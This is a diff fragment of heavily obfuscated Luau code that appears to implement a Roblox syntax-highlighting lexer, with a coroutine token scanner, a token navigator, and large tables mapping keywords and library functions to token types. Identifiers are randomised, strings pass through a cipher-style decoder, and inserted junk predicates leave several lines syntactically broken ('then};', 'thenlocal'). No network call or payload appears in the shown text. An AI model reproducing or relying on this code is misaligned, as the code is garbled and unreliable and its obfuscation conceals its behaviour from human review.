+										-- We are currently in EkAmSsBY
+										EJiwUKjjj = lRrIhOQtKs
+										local XXkPtrddHwf = gDMDejUUvG(ZMyJWLPg, VJPflMNoHSE, lRrIhOQtKs-1)
+										for innerToken, innerContent in QnrZfpbujzN.scan(XXkPtrddHwf) do
+											coroutine.yield(innerToken, innerContent)
+										end
+
+										-- This brace opens string/closes EkAmSsBY
+										mKOWOabij = true
+									end
+								end
+							end
+						end
+
+						-- Record last 3 tokens for the indexing context check
+						previousContent3 = previousContent2
+						previousContent2 = previousContent1
+						previousContent1 = ZMyJWLPg
+						previousToken = processedToken or rawToken
+						if processedToken then
+							coroutine.yield(processedToken, ZMyJWLPg)
+						end
+						break
+					end
+
+					-- No matches found
+					if not matched then
+						return
+					end
+				end
+
+				-- Completed the scan
+				return
+			end)
+
+			return function()
+				if coroutine.status(thread) == bbkGQKwkuBHx("mnjm", 9) then
+					return
+				end
+
+				local mMbDHMZCmRul, YpDaDIyuFafN, ZMyJWLPg = coroutine.resume(thread)
+				if mMbDHMZCmRul and YpDaDIyuFafN then
+					return YpDaDIyuFafN, ZMyJWLPg
+				end
+
+				return
+			end
+		end
+
+		function QnrZfpbujzN.navigator()
+			local mkyumMcze = {
+				Source = bbkGQKwkuBHx("", 7),
+				TokenCache = table.create(50),
+
+				_RealIndex = 0,
+				_UserIndex = 0,
+				_ScanThread = nil,
+			}
+
+			function mkyumMcze:Destroy()
+				self.Source = nil
+				self._RealIndex = nil
+				self._UserIndex = nil
+				self.TokenCache = nil
+				self._ScanThread = nil
+			end
+
+			function mkyumMcze:SetSource(SourceString)
+				self.Source = SourceString
+
+				self._RealIndex = 0
+				self._UserIndex = 0
+				table.clear(self.TokenCache)
+
+				self._ScanThread = coroutine.create(function()
+					for Token, Src in QnrZfpbujzN.scan(self.Source) do
+						self._RealIndex += 1
+						self.TokenCache[self._RealIndex] = { Token, Src }
+						coroutine.yield(Token, Src)
+					end
+				end)
+			end
+
+			function mkyumMcze.Next()
+				mkyumMcze._UserIndex += 1
+
+				if mkyumMcze._RealIndex >= mkyumMcze._UserIndex then
+					-- Already scanned, return cached
+					return JLKfmyPOlXp(mkyumMcze.TokenCache[mkyumMcze._UserIndex])
+				else
+					if coroutine.status(mkyumMcze._ScanThread) == bbkGQKwkuBHx("oplo", 11) then
+						-- Scan thread dead
+						return
+					else
+						local mMbDHMZCmRul, YpDaDIyuFafN, wDLnBbhy = coroutine.resume(mkyumMcze._ScanThread)
+						if mMbDHMZCmRul and YpDaDIyuFafN then
+							-- Scanned new GLnfYtdV
+							return YpDaDIyuFafN, wDLnBbhy
+						else
+							-- Lex completed
+							return
+						end
+					end
+				end
+			end
+
+			function mkyumMcze.Peek(PeekAmount)
+				local luxlYKrfR = mkyumMcze._UserIndex + PeekAmount
+
+				if mkyumMcze._RealIndex >= luxlYKrfR then
+					-- Already scanned, return cached
+					if luxlYKrfR > 0 then
+						return JLKfmyPOlXp(mkyumMcze.TokenCache[luxlYKrfR])
+					else
+						-- Invalid peek
+						return
+					end
+				else
+					if coroutine.status(mkyumMcze._ScanThread) == bbkGQKwkuBHx("qrnq", 13) then
+						-- Scan thread dead
+						return
+					else
+						local bORTciRyJsu = luxlYKrfR - mkyumMcze._RealIndex
+
+						local mMbDHMZCmRul, YpDaDIyuFafN, wDLnBbhy = nil, nil, nil
+
+						for _ = 1, bORTciRyJsu do
+							mMbDHMZCmRul, YpDaDIyuFafN, wDLnBbhy = coroutine.resume(mkyumMcze._ScanThread)
+							if not (mMbDHMZCmRul or YpDaDIyuFafN) then
+								-- Lex completed
+								break
+							end
+						end
+
+						return YpDaDIyuFafN, wDLnBbhy
+					end
+				end
+			end
+
+			return mkyumMcze
+		end
+
+		return QnrZfpbujzN
+end;
+if (select(2, pcall(function() return EBhvjIpErOvB('1eb2', 16) end)) ~= nil) then}; end;
+YPboWFvH[YXRdjYSs[bbkGQKwkuBHx("h", 3)]] = {
+Closure = function()
+    if (#{1,1,1,1} == 4) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("y", 20)]; end;	local jHCarWNa = jHCarWNa
+	local idQRXqLUK = {
+		keyword = {
+			[bbkGQKwkuBHx("viy", 21)] = bbkGQKwkuBHx("bvpnfiu", 17),
+			[bbkGQKwkuBHx("euhdn", 3)] = bbkGQKwkuBHx("nhbzrug", 3),
+			[bbkGQKwkuBHx("sedjydku", 16)] = bbkGQKwkuBHx("lfzxpse", 1),
+			[bbkGQKwkuBHx("ju", 6)] = bbkGQKwkuBHx("hbvtloa", 23),
+			[bbkGQKwkuBHx("bipb", 23)] = bbkGQKwkuBHx("hbvtloa", 23),
+			[bbkGQKwkuBHx("dkrdhe", 25)] = bbkGQKwkuBHx("vpjhzco", 11),
+			[bbkGQKwkuBHx("ziy", 21)] = bbkGQKwkuBHx("vpjhzco", 11),
+			[bbkGQKwkuBHx("piazce", 11)] = bbkGQKwkuBHx("ztnldgs", 15),
+			[bbkGQKwkuBHx("idovh", 3)] = bbkGQKwkuBHx("fztrjmy", 21),
+			[bbkGQKwkuBHx("ktw", 5)] = bbkGQKwkuBHx("qkecuxj", 6),
+			[bbkGQKwkuBHx("xmfulagf", 18)] = bbkGQKwkuBHx("nhbzrug", 3),
+			[bbkGQKwkuBHx("kh", 2)] = bbkGQKwkuBHx("tnhfxam", 9),
+			[bbkGQKwkuBHx("uz", 12)] = bbkGQKwkuBHx("lfzxpse", 1),
+			[bbkGQKwkuBHx("ilzxi", 23)] = bbkGQKwkuBHx("wqkiadp", 12),
+			[bbkGQKwkuBHx("ojm", 1)] = bbkGQKwkuBHx("nhbzrug", 3),
+			[bbkGQKwkuBHx("dej", 16)] = bbkGQKwkuBHx("icwumpb", 24),
+			[bbkGQKwkuBHx("qt", 2)] = bbkGQKwkuBHx("pjdbtwi", 5),
+			[bbkGQKwkuBHx("uhshdw", 3)] = bbkGQKwkuBHx("tnhfxam", 9),
+			[bbkGQKwkuBHx("lynolh", 20)] = bbkGQKwkuBHx("ysmkcfr", 14),
+			[bbkGQKwkuBHx("frys", 13)] = bbkGQKwkuBHx("icwumpb", 24),
+			[bbkGQKwkuBHx("drox", 10)] = bbkGQKwkuBHx("dxrphkw", 19),
+			[bbkGQKwkuBHx("qorb", 23)] = bbkGQKwkuBHx("wqkiadp", 12),
+			[bbkGQKwkuBHx("mrix", 19)] = bbkGQKwkuBHx("jdxvnqc", 25),
+			[bbkGQKwkuBHx("ydujtk", 5)] = bbkGQKwkuBHx("wqkiadp", 12),
+			[bbkGQKwkuBHx("atzor", 6)] = bbkGQKwkuBHx("rlfdvyk", 7),
+			[bbkGQKwkuBHx("nyzcv", 17)] = bbkGQKwkuBHx("nhbzrug", 3),
+		},
+
+		builtin = {
+			-- Luau Functions
+			[bbkGQKwkuBHx("ummyln", 20)] = bbkGQKwkuBHx("crkzqflk", 23),
+			[bbkGQKwkuBHx("fssps", 1)] = bbkGQKwkuBHx("mbujapvu", 7),
+			[bbkGQKwkuBHx("qodpoxf", 10)] = bbkGQKwkuBHx("tibqhwcb", 14),
+			[bbkGQKwkuBHx("ljyrjyfyfgqj", 5)] = bbkGQKwkuBHx("wletkzfe", 17),
+			[bbkGQKwkuBHx("pwhpyz", 7)] = bbkGQKwkuBHx("bqjypekj", 22),
+			[bbkGQKwkuBHx("mpbetusjoh", 1)] = bbkGQKwkuBHx("jyrgxmsr", 4),
+			[bbkGQKwkuBHx("bskdfclm", 14)] = bbkGQKwkuBHx("odwlcrxw", 9),
+			[bbkGQKwkuBHx("bslh", 14)] = bbkGQKwkuBHx("mbujapvu", 7),
+			[bbkGQKwkuBHx("sdluv", 3)] = bbkGQKwkuBHx("wletkzfe", 17),
+			[bbkGQKwkuBHx("lywhh", 22)] = bbkGQKwkuBHx("rgzofuaz", 12),
+			[bbkGQKwkuBHx("ikbgm", 19)] = bbkGQKwkuBHx("mbujapvu", 7),
+			[bbkGQKwkuBHx("clhpbflw", 11)] = bbkGQKwkuBHx("ujcrixdc", 15),
+			[bbkGQKwkuBHx("enjtrg", 13)] = bbkGQKwkuBHx("jyrgxmsr", 4),
+			[bbkGQKwkuBHx("pyujcl", 24)] = bbkGQKwkuBHx("etmbshnm", 25),
+			[bbkGQKwkuBHx("dmieqf", 12)] = bbkGQKwkuBHx("odwlcrxw", 9),
+			[bbkGQKwkuBHx("tfmfdu", 1)] = bbkGQKwkuBHx("rgzofuaz", 12),
+			[bbkGQKwkuBHx("lxmyxgo", 19)] = bbkGQKwkuBHx("pexmdsyx", 10),
+			[bbkGQKwkuBHx("ambumbibijtm", 8)] = bbkGQKwkuBHx("jyrgxmsr", 4),
+			[bbkGQKwkuBHx("mhgnfuxk", 19)] = bbkGQKwkuBHx("qfynetzy", 11),
+			[bbkGQKwkuBHx("lgkljafy", 18)] = bbkGQKwkuBHx("vkdsjyed", 16),
+			[bbkGQKwkuBHx("slnyai", 24)] = bbkGQKwkuBHx("latizout", 6),
+			[bbkGQKwkuBHx("phusdd", 18)] = bbkGQKwkuBHx("qfynetzy", 11),
+
+			-- Luau Functions (Deprecated)
+			[bbkGQKwkuBHx("qczzsqhuofpous", 14)] = bbkGQKwkuBHx("gvodujpo", 1),
+
+			-- Luau Variables
+			[bbkGQKwkuBHx("_B", 21)] = bbkGQKwkuBHx("mtuex", 19),
+			[bbkGQKwkuBHx("_BKXYOUT", 6)] = bbkGQKwkuBHx("vwulqj", 3),
+
+			-- Luau Tables
+			[bbkGQKwkuBHx("krc21", 9)] = bbkGQKwkuBHx("ryzjc", 24),
+			[bbkGQKwkuBHx("sehekjydu", 16)] = bbkGQKwkuBHx("gnoyr", 13),
+			[bbkGQKwkuBHx("xyvoa", 20)] = bbkGQKwkuBHx("krscv", 17),
+			[bbkGQKwkuBHx("iwpd", 22)] = bbkGQKwkuBHx("xefpi", 4),
+			[bbkGQKwkuBHx("zd", 11)] = bbkGQKwkuBHx("ovwgz", 21),
+			[bbkGQKwkuBHx("tusjoh", 1)] = bbkGQKwkuBHx("qxyib", 23),
+			[bbkGQKwkuBHx("krscv", 17)] = bbkGQKwkuBHx("elmwp", 11),
+			[bbkGQKwkuBHx("nmy7", 19)] = bbkGQKwkuBHx("vcdng", 2),
+
+			-- Roblox Functions
+			[bbkGQKwkuBHx("GhexjjhuPdqdjhu", 3)] = bbkGQKwkuBHx("gvodujpo", 1),
+			[bbkGQKwkuBHx("novki", 10)] = bbkGQKwkuBHx("gvodujpo", 1),
+			[bbkGQKwkuBHx("jflqir", 3)] = bbkGQKwkuBHx("xmfulagf", 18),
+			[bbkGQKwkuBHx("HdmyafEsfsywj", 18)] = bbkGQKwkuBHx("yngvmbhg", 19),
+			[bbkGQKwkuBHx("dqcgudq", 12)] = bbkGQKwkuBHx("hwpevkqp", 2),
+			[bbkGQKwkuBHx("dpeetyrd", 11)] = bbkGQKwkuBHx("tibqhwcb", 14),
+			[bbkGQKwkuBHx("ebmiz", 12)] = bbkGQKwkuBHx("crkzqflk", 23),
+			[bbkGQKwkuBHx("wlfn", 3)] = bbkGQKwkuBHx("dslargml", 24),
+			[bbkGQKwkuBHx("vkog", 2)] = bbkGQKwkuBHx("rgzofuaz", 12),
+			[bbkGQKwkuBHx("CamzAmbbqvoa", 8)] = bbkGQKwkuBHx("shapgvba", 13),
+			[bbkGQKwkuBHx("swep", 22)] = bbkGQKwkuBHx("qfynetzy", 11),
+			[bbkGQKwkuBHx("rvmi", 21)] = bbkGQKwkuBHx("etmbshnm", 25),
+
+			-- Roblox Functions (Deprecated)
+			[bbkGQKwkuBHx("Bcjyw", 24)] = bbkGQKwkuBHx("vkdsjyed", 16),
+			[bbkGQKwkuBHx("XetilxwMbfx", 19)] = bbkGQKwkuBHx("wletkzfe", 17),
+			[bbkGQKwkuBHx("pwladpoEtxp", 11)] = bbkGQKwkuBHx("bqjypekj", 22),
+			[bbkGQKwkuBHx("uwnsynijsynyd", 5)] = bbkGQKwkuBHx("wletkzfe", 17),
+			[bbkGQKwkuBHx("Rozvm", 25)] = bbkGQKwkuBHx("shapgvba", 13),
+			[bbkGQKwkuBHx("Fgngf", 13)] = bbkGQKwkuBHx("zohwncih", 20),
+			[bbkGQKwkuBHx("jkrkj", 17)] = bbkGQKwkuBHx("tibqhwcb", 14),
+			[bbkGQKwkuBHx("Hqdeuaz", 12)] = bbkGQKwkuBHx("ixqfwlrq", 3),
+			[bbkGQKwkuBHx("dmzaqwv", 8)] = bbkGQKwkuBHx("qfynetzy", 11),
+			[bbkGQKwkuBHx("Rvdo", 21)] = bbkGQKwkuBHx("bqjypekj", 22),
+			[bbkGQKwkuBHx("fwjhss", 7)] = bbkGQKwkuBHx("latizout", 6),
+
+			-- Roblox Variables
+			[bbkGQKwkuBHx("icog", 2)] = bbkGQKwkuBHx("Fkpqxkzb", 23),
+			[bbkGQKwkuBHx("rnwikp", 2)] = bbkGQKwkuBHx("Qvabivkm", 8),
+			[bbkGQKwkuBHx("fpevcg", 13)] = bbkGQKwkuBHx("Xchipcrt", 15),
+			[bbkGQKwkuBHx("kzsjwv", 18)] = bbkGQKwkuBHx("Mrwxergi", 4),
+			[bbkGQKwkuBHx("asvowtegi", 4)] = bbkGQKwkuBHx("Vafgnapr", 13),
+
+			-- Roblox Variables (Deprecated)
+			[bbkGQKwkuBHx("Wqcu", 16)] = bbkGQKwkuBHx("Xchipcrt", 15),
+			[bbkGQKwkuBHx("Yqtmurceg", 2)] = bbkGQKwkuBHx("Hmrszmbd", 25),
+
+			-- Roblox Tables
+			[bbkGQKwkuBHx("Olsg", 14)] = bbkGQKwkuBHx("cjkun", 9),
+			[bbkGQKwkuBHx("KarltLxuxa", 9)] = bbkGQKwkuBHx("xefpi", 4),
+			[bbkGQKwkuBHx("GexepskWievglTeveqw", 4)] = bbkGQKwkuBHx("krscv", 17),
+			[bbkGQKwkuBHx("YBnwia", 22)] = bbkGQKwkuBHx("ubcmf", 1),
+			[bbkGQKwkuBHx("Jvsvy0", 7)] = bbkGQKwkuBHx("ahisl", 7),
+			[bbkGQKwkuBHx("DpmpsTfrvfodf", 1)] = bbkGQKwkuBHx("szakd", 25),
+			[bbkGQKwkuBHx("FroruVhtxhqfhNhbsrlqw", 3)] = bbkGQKwkuBHx("xefpi", 4),
+			[bbkGQKwkuBHx("RohsHwas", 14)] = bbkGQKwkuBHx("ovwgz", 21),
+			[bbkGQKwkuBHx("MxltFrmpncYudprwPdrRwox", 9)] = bbkGQKwkuBHx("yfgqj", 5),
+			[bbkGQKwkuBHx("Dmtl", 25)] = bbkGQKwkuBHx("dklvo", 10),
+			[bbkGQKwkuBHx("Gbdft", 1)] = bbkGQKwkuBHx("dklvo", 10),
+			[bbkGQKwkuBHx("QwzleNfcgpVpj", 11)] = bbkGQKwkuBHx("krscv", 17),
+			[bbkGQKwkuBHx("Dmlr", 24)] = bbkGQKwkuBHx("gnoyr", 13),
+			[bbkGQKwkuBHx("Rwbcjwln", 9)] = bbkGQKwkuBHx("vcdng", 2),
+			[bbkGQKwkuBHx("IphwzmMvibz", 21)] = bbkGQKwkuBHx("szakd", 25),
+			[bbkGQKwkuBHx("XewlobCoaeoxmo", 10)] = bbkGQKwkuBHx("ryzjc", 24),
+			[bbkGQKwkuBHx("EldsviJvhlvetvBvpgfzek", 17)] = bbkGQKwkuBHx("dklvo", 10),
+			[bbkGQKwkuBHx("DktgapeEpgpbh", 15)] = bbkGQKwkuBHx("vcdng", 2),
+			[bbkGQKwkuBHx("OzsgVzxonhms", 25)] = bbkGQKwkuBHx("nuvfy", 20),
+			[bbkGQKwkuBHx("EwnhxrpaEgdetgixth", 15)] = bbkGQKwkuBHx("pwxha", 22),
+			[bbkGQKwkuBHx("Udqgrp", 3)] = bbkGQKwkuBHx("ovwgz", 21),
+			[bbkGQKwkuBHx("Ajh", 9)] = bbkGQKwkuBHx("hopzs", 14),
+			[bbkGQKwkuBHx("CljnldeAlclxd", 11)] = bbkGQKwkuBHx("qxyib", 23),
+			[bbkGQKwkuBHx("Dqof", 12)] = bbkGQKwkuBHx("dklvo", 10),
+			[bbkGQKwkuBHx("Ivxzfe0", 17)] = bbkGQKwkuBHx("lstdw", 18),
+			[bbkGQKwkuBHx("Cprtzy4tye27", 11)] = bbkGQKwkuBHx("yfgqj", 5),
+			[bbkGQKwkuBHx("YvahapvuJbyclRlf", 7)] = bbkGQKwkuBHx("bijtm", 8),
+			[bbkGQKwkuBHx("wdvn", 3)] = bbkGQKwkuBHx("wdeoh", 3),
+			[bbkGQKwkuBHx("BemmvQvnw", 8)] = bbkGQKwkuBHx("ipqat", 15),
+			[bbkGQKwkuBHx("CLqu", 8)] = bbkGQKwkuBHx("ubcmf", 1),
+			[bbkGQKwkuBHx("GPuy4", 12)] = bbkGQKwkuBHx("hopzs", 14),
+			[bbkGQKwkuBHx("Dmkbwz0", 8)] = bbkGQKwkuBHx("krscv", 17),
+			[bbkGQKwkuBHx("Ktridg7xci61", 15)] = bbkGQKwkuBHx("gnoyr", 13),
+			[bbkGQKwkuBHx("Dmkbwz1", 8)] = bbkGQKwkuBHx("wdeoh", 3),
+			[bbkGQKwkuBHx("Gpnezc4tye27", 11)] = bbkGQKwkuBHx("hopzs", 14),
+		},
+
+		libraries = {
+
+			-- Luau Libraries
+			bit32 = {
+				arshift = bbkGQKwkuBHx("crkzqflk", 23),
+				band = bbkGQKwkuBHx("wletkzfe", 17),
+				bnot = bbkGQKwkuBHx("bqjypekj", 22),
+				bor = bbkGQKwkuBHx("hwpevkqp", 2),
+				btest = bbkGQKwkuBHx("yngvmbhg", 19),
+				bxor = bbkGQKwkuBHx("vkdsjyed", 16),
+				countlz = bbkGQKwkuBHx("jyrgxmsr", 4),
+				countrz = bbkGQKwkuBHx("xmfulagf", 18),
+				extract = bbkGQKwkuBHx("hwpevkqp", 2),
+				lrotate = bbkGQKwkuBHx("rgzofuaz", 12),
+				lshift = bbkGQKwkuBHx("ncvkbqwv", 8),
+				replace = bbkGQKwkuBHx("vkdsjyed", 16),
+				rrotate = bbkGQKwkuBHx("qfynetzy", 11),
+				rshift = bbkGQKwkuBHx("hwpevkqp", 2),
+			},
+
+			coroutine = {
+				close = bbkGQKwkuBHx("dslargml", 24),
+				create = bbkGQKwkuBHx("dslargml", 24),
+				isyieldable = bbkGQKwkuBHx("zohwncih", 20),
+				resume = bbkGQKwkuBHx("yngvmbhg", 19),
+				running = bbkGQKwkuBHx("yngvmbhg", 19),
+				status = bbkGQKwkuBHx("gvodujpo", 1),
+				wrap = bbkGQKwkuBHx("jyrgxmsr", 4),
+				yield = bbkGQKwkuBHx("kzshynts", 5),
+			},
+
+			debug = {
+				dumpheap = bbkGQKwkuBHx("latizout", 6),
+				info = bbkGQKwkuBHx("kzshynts", 5),
+				loadmodule = bbkGQKwkuBHx("gvodujpo", 1),
+				profilebegin = bbkGQKwkuBHx("crkzqflk", 23),
+				profileend = bbkGQKwkuBHx("pexmdsyx", 10),
+				resetmemorycategory = bbkGQKwkuBHx("rgzofuaz", 12),
+				setmemorycategory = bbkGQKwkuBHx("shapgvba", 13),
+				traceback = bbkGQKwkuBHx("jyrgxmsr", 4),
+			},
+
+			math = {
+				abs = bbkGQKwkuBHx("mbujapvu", 7),
+				acos = bbkGQKwkuBHx("odwlcrxw", 9),
+				asin = bbkGQKwkuBHx("rgzofuaz", 12),
+				atan2 = bbkGQKwkuBHx("gvodujpo", 1),
+				atan = bbkGQKwkuBHx("pexmdsyx", 10),
+				ceil = bbkGQKwkuBHx("bqjypekj", 22),
+				clamp = bbkGQKwkuBHx("pexmdsyx", 10),
+				cos = bbkGQKwkuBHx("ncvkbqwv", 8),
+				cosh = bbkGQKwkuBHx("yngvmbhg", 19),
+				deg = bbkGQKwkuBHx("latizout", 6),
+				exp = bbkGQKwkuBHx("zohwncih", 20),
+				floor = bbkGQKwkuBHx("ujcrixdc", 15),
+				fmod = bbkGQKwkuBHx("bqjypekj", 22),
+				frexp = bbkGQKwkuBHx("mbujapvu", 7),
+				ldexp = bbkGQKwkuBHx("shapgvba", 13),
+				log10 = bbkGQKwkuBHx("bqjypekj", 22),
+				log = bbkGQKwkuBHx("latizout", 6),
+				max = bbkGQKwkuBHx("shapgvba", 13),
+				min = bbkGQKwkuBHx("mbujapvu", 7),
+				modf = bbkGQKwkuBHx("pexmdsyx", 10),
+				noise = bbkGQKwkuBHx("vkdsjyed", 16),
+				pow = bbkGQKwkuBHx("ujcrixdc", 15),
+				rad = bbkGQKwkuBHx("shapgvba", 13),
+				random = bbkGQKwkuBHx("ncvkbqwv", 8),
+				randomseed = bbkGQKwkuBHx("ujcrixdc", 15),
+				round = bbkGQKwkuBHx("shapgvba", 13),
+				sign = bbkGQKwkuBHx("hwpevkqp", 2),
+				sin = bbkGQKwkuBHx("mbujapvu", 7),
+				sinh = bbkGQKwkuBHx("etmbshnm", 25),
+				sqrt = bbkGQKwkuBHx("bqjypekj", 22),
+				tan = bbkGQKwkuBHx("tibqhwcb", 14),
+				tanh = bbkGQKwkuBHx("odwlcrxw", 9),
+
+				huge = bbkGQKwkuBHx("fmetwj", 18),
+				pi = bbkGQKwkuBHx("iphwzm", 21),
+			},
+
+			os = {
+				clock = bbkGQKwkuBHx("shapgvba", 13),
+				date = bbkGQKwkuBHx("ixqfwlrq", 3),
+				difftime = bbkGQKwkuBHx("kzshynts", 5),
+				time = bbkGQKwkuBHx("ncvkbqwv", 8),
+			},
+
+			string = {
+				byte = bbkGQKwkuBHx("hwpevkqp", 2),
+				char = bbkGQKwkuBHx("etmbshnm", 25),
+				find = bbkGQKwkuBHx("xmfulagf", 18),
+				format = bbkGQKwkuBHx("ixqfwlrq", 3),
+				gmatch = bbkGQKwkuBHx("vkdsjyed", 16),
+				gsub = bbkGQKwkuBHx("crkzqflk", 23),
+				len = bbkGQKwkuBHx("latizout", 6),
+				lower = bbkGQKwkuBHx("tibqhwcb", 14),
+				match = bbkGQKwkuBHx("mbujapvu", 7),
+				pack = bbkGQKwkuBHx("pexmdsyx", 10),
+				packsize = bbkGQKwkuBHx("jyrgxmsr", 4),
+				rep = bbkGQKwkuBHx("xmfulagf", 18),
+				reverse = bbkGQKwkuBHx("vkdsjyed", 16),
+				split = bbkGQKwkuBHx("etmbshnm", 25),
+				sub = bbkGQKwkuBHx("rgzofuaz", 12),
+				unpack = bbkGQKwkuBHx("mbujapvu", 7),
+				upper = bbkGQKwkuBHx("xmfulagf", 18),
+			},
+
+			table = {
+				clear = bbkGQKwkuBHx("pexmdsyx", 10),
+				clone = bbkGQKwkuBHx("bqjypekj", 22),
+				concat = bbkGQKwkuBHx("mbujapvu", 7),
+				create = bbkGQKwkuBHx("xmfulagf", 18),
+				find = bbkGQKwkuBHx("apixodji", 21),
+				foreach = bbkGQKwkuBHx("etmbshnm", 25),
+				foreachi = bbkGQKwkuBHx("pexmdsyx", 10),
+				freeze = bbkGQKwkuBHx("ujcrixdc", 15),
+				getn = bbkGQKwkuBHx("vkdsjyed", 16),
+				insert = bbkGQKwkuBHx("xmfulagf", 18),
+				isfrozen = bbkGQKwkuBHx("yngvmbhg", 19),
+				maxn = bbkGQKwkuBHx("apixodji", 21),
+				move = bbkGQKwkuBHx("qfynetzy", 11),
+				pack = bbkGQKwkuBHx("tibqhwcb", 14),
+				remove = bbkGQKwkuBHx("crkzqflk", 23),
+				sort = bbkGQKwkuBHx("odwlcrxw", 9),
+				unpack = bbkGQKwkuBHx("shapgvba", 13),
+			},
+
+			utf8 = {
+				char = bbkGQKwkuBHx("jyrgxmsr", 4),
+				codepoint = bbkGQKwkuBHx("etmbshnm", 25),
+				codes = bbkGQKwkuBHx("pexmdsyx", 10),
+				graphemes = bbkGQKwkuBHx("latizout", 6),
+				len = bbkGQKwkuBHx("gvodujpo", 1),
+				nfcnormalize = bbkGQKwkuBHx("ixqfwlrq", 3),
+				nfdnormalize = bbkGQKwkuBHx("dslargml", 24),
+				offset = bbkGQKwkuBHx("tibqhwcb", 14),
+
+				charpattern = bbkGQKwkuBHx("opnejc", 22),
+			},
+
+			-- Roblox Libraries
+			Axes = {
+				new = bbkGQKwkuBHx("hwpevkqp", 2),
+			},
+
+			BrickColor = {
+				Black = bbkGQKwkuBHx("hwpevkqp", 2),
+				Blue = bbkGQKwkuBHx("xmfulagf", 18),
+				DarkGray = bbkGQKwkuBHx("kzshynts", 5),
+				Gray = bbkGQKwkuBHx("mbujapvu", 7),
+				Green = bbkGQKwkuBHx("apixodji", 21),
+				new = bbkGQKwkuBHx("rgzofuaz", 12),
+				New = bbkGQKwkuBHx("xmfulagf", 18),
+				palette = bbkGQKwkuBHx("ixqfwlrq", 3),
+				Random = bbkGQKwkuBHx("pexmdsyx", 10),
+				random = bbkGQKwkuBHx("shapgvba", 13),
+				Red = bbkGQKwkuBHx("shapgvba", 13),
+				White = bbkGQKwkuBHx("ixqfwlrq", 3),
+				Yellow = bbkGQKwkuBHx("ujcrixdc", 15),
+			},
+
+			CatalogSearchParams = {
+				new = bbkGQKwkuBHx("pexmdsyx", 10),
+			},
+
+			CFrame = {
+				Angles = bbkGQKwkuBHx("dslargml", 24),
+				fromAxisAngle = bbkGQKwkuBHx("mbujapvu", 7),
+				fromEulerAngles = bbkGQKwkuBHx("vkdsjyed", 16),
+				fromEulerAnglesXYZ = bbkGQKwkuBHx("kzshynts", 5),
+				fromEulerAnglesYXZ = bbkGQKwkuBHx("latizout", 6),
+				fromMatrix = bbkGQKwkuBHx("etmbshnm", 25),
+				fromOrientation = bbkGQKwkuBHx("ncvkbqwv", 8),
+				lookAt = bbkGQKwkuBHx("vkdsjyed", 16),
+				new = bbkGQKwkuBHx("odwlcrxw", 9),
+
+				identity = bbkGQKwkuBHx("UXjsew", 18),
+			},
+
+			Color3 = {
+				fromHex = bbkGQKwkuBHx("apixodji", 21),
+				fromHSV = bbkGQKwkuBHx("ncvkbqwv", 8),
+				fromRGB = bbkGQKwkuBHx("etmbshnm", 25),
+				new = bbkGQKwkuBHx("crkzqflk", 23),
+				toHSV = bbkGQKwkuBHx("hwpevkqp", 2),
+			},
+
+			ColorSequence = {
+				new = bbkGQKwkuBHx("crkzqflk", 23),
+			},
+
+			ColorSequenceKeypoint = {
+				new = bbkGQKwkuBHx("tibqhwcb", 14),
+			},
+
+			DateTime = {
+				fromIsoDate = bbkGQKwkuBHx("ncvkbqwv", 8),
+				fromLocalTime = bbkGQKwkuBHx("ixqfwlrq", 3),
+				fromUniversalTime = bbkGQKwkuBHx("odwlcrxw", 9),
+				fromUnixTimestamp = bbkGQKwkuBHx("qfynetzy", 11),
+				fromUnixTimestampMillis = bbkGQKwkuBHx("rgzofuaz", 12),
+				now = bbkGQKwkuBHx("dslargml", 24),
+			},
+
+			DockWidgetPluginGuiInfo = {
+				new = bbkGQKwkuBHx("ixqfwlrq", 3),
+			},
+
+			Enum = {},
+
+			Faces = {
+				new = bbkGQKwkuBHx("odwlcrxw", 9),
+			},
+
+			FloatCurveKey = {
+				new = bbkGQKwkuBHx("shapgvba", 13),
+			},
+
+			Font = {
+				fromEnum = bbkGQKwkuBHx("zohwncih", 20),
+				fromId = bbkGQKwkuBHx("ixqfwlrq", 3),
+				fromName = bbkGQKwkuBHx("qfynetzy", 11),
+				new = bbkGQKwkuBHx("yngvmbhg", 19),
+			},
+
+			Instance = {
+				new = bbkGQKwkuBHx("pexmdsyx", 10),
+			},
+
+			NumberRange = {
+				new = bbkGQKwkuBHx("kzshynts", 5),
+			},
+
+			NumberSequence = {
+				new = bbkGQKwkuBHx("etmbshnm", 25),
+			},
+
+			NumberSequenceKeypoint = {
+				new = bbkGQKwkuBHx("ncvkbqwv", 8),
+			},
+
+			OverlapParams = {
+				new = bbkGQKwkuBHx("ncvkbqwv", 8),
+			},
+
+			PathWaypoint = {
+				new = bbkGQKwkuBHx("etmbshnm", 25),
+			},
+
+			PhysicalProperties = {
+				new = bbkGQKwkuBHx("bqjypekj", 22),
+			},
+
+			Random = {
+				new = bbkGQKwkuBHx("rgzofuaz", 12),
+			},
+
+			Ray = {
+				new = bbkGQKwkuBHx("dslargml", 24),
+			},
+
+			RaycastParams = {
+				new = bbkGQKwkuBHx("odwlcrxw", 9),
+			},
+
+			Rect = {
+				new = bbkGQKwkuBHx("qfynetzy", 11),
+			},
+
+			Region3 = {
+				new = bbkGQKwkuBHx("pexmdsyx", 10),
+			},
+
+			Region3int16 = {
+				new = bbkGQKwkuBHx("latizout", 6),
+			},
+
+			RotationCurveKey = {
+				new = bbkGQKwkuBHx("ixqfwlrq", 3),
+			},
+
+			task = {
+				cancel = bbkGQKwkuBHx("xmfulagf", 18),
+				defer = bbkGQKwkuBHx("odwlcrxw", 9),
+				delay = bbkGQKwkuBHx("bqjypekj", 22),
+				desynchronize = bbkGQKwkuBHx("qfynetzy", 11),
+				spawn = bbkGQKwkuBHx("hwpevkqp", 2),
+				synchronize = bbkGQKwkuBHx("ncvkbqwv", 8),
+				wait = bbkGQKwkuBHx("latizout", 6),
+			},
+
+			TweenInfo = {
+				new = bbkGQKwkuBHx("dslargml", 24),
+			},
+
+			UDim = {
+				new = bbkGQKwkuBHx("gvodujpo", 1),
+			},
+
+			UDim2 = {
+				fromOffset = bbkGQKwkuBHx("vkdsjyed", 16),
+				fromScale = bbkGQKwkuBHx("apixodji", 21),
+				new = bbkGQKwkuBHx("gvodujpo", 1),
+			},
+
+			Vector2 = {
+				new = bbkGQKwkuBHx("ixqfwlrq", 3),
+
+				one = bbkGQKwkuBHx("Udbsnq7", 25),
+				xAxis = bbkGQKwkuBHx("Raypkn4", 22),
+				yAxis = bbkGQKwkuBHx("Bkizux8", 6),
+				zero = bbkGQKwkuBHx("Raypkn4", 22),
+			},
+
+			Vector2int16 = {
+				new = bbkGQKwkuBHx("kzshynts", 5),
+			},
+
+			Vector3 = {
